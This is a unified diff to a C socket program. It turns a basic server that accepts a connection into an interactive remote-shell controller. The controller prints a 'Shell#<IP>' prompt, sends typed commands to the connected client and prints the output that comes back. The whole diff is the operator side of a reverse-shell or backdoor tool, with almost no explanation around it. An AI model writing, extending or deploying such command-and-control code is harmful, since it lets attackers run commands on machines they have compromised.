@@ -9,7 +9,7 @@
 
 int main()
 {
-    int sock, client_sock;
+    int sock, client_socket;
     char buffer[1024];
     char response[18384];
     struct sockaddr_in server_address, client_address, target_address;
@@ -52,19 +52,21 @@ int main()
 
     // Accept client connections
     client_length = sizeof(client_address);
-    client_sock = accept(sock, (struct sockaddr *) &client_address, &client_length);
-    if (client_sock < 0) {
-        perror("Error accepting connection");
-        close(sock);
-        return 1;
+    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
+    while(1) {
+        jump:
+        bzero(&buffer, sizeof(buffer));
+        bzero(&response, sizeof(response));
+        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
+        fgets(buffer,  sizeof(buffer), stdin);
+        strtok(buffer, "\n");
+        write(client_socket, buffer, sizeof(buffer));
+        if(strncmp("q", buffer, 1) == 0) {
+            break;
+        }
+        else {
+            recv(client_socket, response, sizeof(response), MSG_WAITALL);
+            printf("%s", response);
+        }
     }
-
-    // Print client connection details
-    printf("Connection accepted from %s:%d\n", inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));
-
-    // Close sockets
-    close(client_sock);
-    close(sock);
-
-    return 0;
 }
